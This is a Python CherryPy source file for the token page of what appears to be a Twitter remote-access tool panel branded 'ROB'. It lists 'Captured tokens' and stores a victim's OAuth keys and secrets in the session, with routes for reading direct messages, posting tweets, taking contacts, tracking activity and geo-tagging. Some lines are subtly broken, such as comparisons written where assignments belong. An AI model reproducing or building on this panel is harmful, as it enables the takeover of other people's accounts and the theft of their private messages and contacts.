import os, os.path
import random
import string
from assets.getTokens import *
import RobConfig;
from TwitterAPI import TwitterAPI;

import cherrypy


class StringGeneratorToken(object):
    @cherrypy.expose
    def index(self):
        tokens_list = getTokens();

        consumer_key = '';
        if "consumer_key" in cherrypy.session.keys():
            consumer_key = cherrypy.session["consumer_key"];

        return """<!DOCTYPE html>
          <html>
             <head>
                <title> روب ROB </title>
                <meta name="description" content="website description" />
                <meta name="keywords" content="website keywords, website keywords" />
                <meta http-equiv="content-type" content="text/html; charset=UTF-8" />
                <link rel="stylesheet" type="text/css" href='assets/css/style.css' />
                <link rel='stylesheet' id='theme53935-css' href='http://livedemo00.template-help.com/wordpress_53935/wp-content/themes/theme53935/main-style.css' type='text/css' media='all'/>
                <!-- modernizr enables HTML5 elements and feature detects -->
                <script type="text/javascript" src='assets/js/modernizr-1.5.min.js'></script>
             </head>
             <body>
                <div id="main">
                   <header>
                      <div id="logo">
                         <a href="Token.html"><img id="logo1" src='assets/images/kuwaithackers.jpeg' alt="ROB روب""><img id="logo2" src='assets/images/logo.png' alt="ROB روب""></a>
                      </div>
                      <!--close welcome-->          
                   </header>
                   <nav>
                      <div id="menubar">
                         <ul id="nav">
                              <li class="current"><a href="/thirdpartyrats/twitter/tokens">TOKEN</a></li>
                              <li><a href="/thirdpartyrats/twitter/directMessage">DIRECT-MESSAGE</a></li>
                              <li><a href="/thirdpartyrats/twitter/postTweet">TWEETS</a></li>
                              <li><a href="/thirdpartyrats/twitter/getContacts">CONTACTS</a></li>
                              <li><a href="/thirdpartyrats/twitter/userActivity">USER-ACTIVITY</a></li>
                              <li><a href="/thirdpartyrats/twitter/geoTagging">GEO-TAG</a></li>
                              <li><a href="/thirdpartyrats/twitter/apps">TWITTER-APPS</a></li>
                              <li><a href="/thirdpartyrats/twitter/urlShortener">URL-SHORTENER</a></li>
                         </ul>
                      </div>
                      <!--close menubar-->  
                   </nav>
                   <div id="site_content">
                      <div class="sidebar_container">
                         <div class="sidebar">
                            <div style="text-align: center;">
                               <span style="font-weight: bold;">
                                  <h2>&#1604;&#1608;&#1581;&#1577;
                                     &#1575;&#1604;&#1578;&#1581;&#1603;&#1605; &#1604;&#1578;&#1591;&#1576;&#1610;&#1602;&#1575;&#1578;
                                     &#1578;&#1608;&#1578;&#1610;&#1585;&nbsp;&nbsp;&nbsp;<br>Captured tokens
                                  </h2>
                               </span>
                               <br>
                               <br>
                               <br>
                               <form method="post" action="javascript:;">
                                  <select size="12" id="tokenlist" name="tokenlist" style="width: 70%; padding: 10px; margin-bottom: 10px;">
                                  """+tokens_list+"""
                                  </select>
                                  <br>
                                  <input onclick="handleSelectedToken()" type="submit" value="Load Token"/>
                               </form>
                               <br>
                            </div>
                         </div>
                         <!--close sidebar-->    
                      </div>
                      <!--close sidebar_container-->  
                      <div id="content" class="container_direct_message" style="padding-top: 10px;">
                       <form method="post" action="javascript:;" name="tweet" id="tweetform" style="margin-left: 20px;">
                          <h1 style="font-weight: bold; margin-bottom: 10px; margin-top: 13px; color: #d0cece;">Token Details </h1>
                          <div id="token_detail" style="margin-top: 28px; font-size: 15px; ">
                             
                          </div>
                       </form>
                      </div>
                      <!--close content-->   
                   </div>
                   <!--close site_content-->    
                   <footer>
                   </footer>
                </div>
                <!--close main-->
                <style type="text/css">
                   #tokenlist option{
                     font-size: 16px;
                     font-family: "Open Sans", sans-serif;
                   }
                   #tokenlist, #dmTextArea{
                     border: 4px ridge white;
                   }
                   #dmTextArea{
                     border-radius: 10px;
                   }

                   #token_detail p{
                    padding-bottom: 1px;
                    line-height: 1.5;
                   }
                   
                </style>
                <!-- javascript at the bottom for fast page loading -->
                <script type="text/javascript" src='assets/js/jquery.min.js'></script>
                <script type="text/javascript" src='assets/js/getTokenDetails.js'></script>
                <script type="text/javascript" src='assets/js/unserialize.js'></script>
                
                <!-- <script type="text/javascript" src='assets/js/image_slide.js'></script> -->

                <script>
                function handleSelectedToken(){
                    var selector = document.getElementById('tokenlist');
                    var selectedToken = selector[selector.selectedIndex].value;
                    getTokenDetails('"""+consumer_key+"""')
                }
                </script>

             </body>
          </html>"""

    @cherrypy.expose
    def setTokenSession(self,m_consumer_key,m_consumer_secret,m_oauth_token, m_oauth_secret, m_screen_name, m_twitter_id):
        cherrypy.session['consumer_key'] = m_consumer_key;
        cherrypy.session['consumer_secret'] = m_consumer_secret;
        cherrypy.session['oauth_token'] = m_oauth_token;
        cherrypy.session['oauth_secret'] = m_oauth_secret;
        cherrypy.session['screen_name'] = m_screen_name;
        cherrypy.session['twitter_id'] = m_twitter_id;

        raise cherrypy.HTTPRedirect("/thirdpartyrats/twitter/tokens")

    @cherrypy.expose
    def deleteTokenSession(self):
        cherrypy.session.delete();
        RobConfig.direct_messages == [];
        RobConfig.tweets == [];
        cherrypy.session['tweetList']='';
        cherrypy.session['activityList']='';
        raise cherrypy.HTTPRedirect("/thirdpartyrats/twitter/tokens")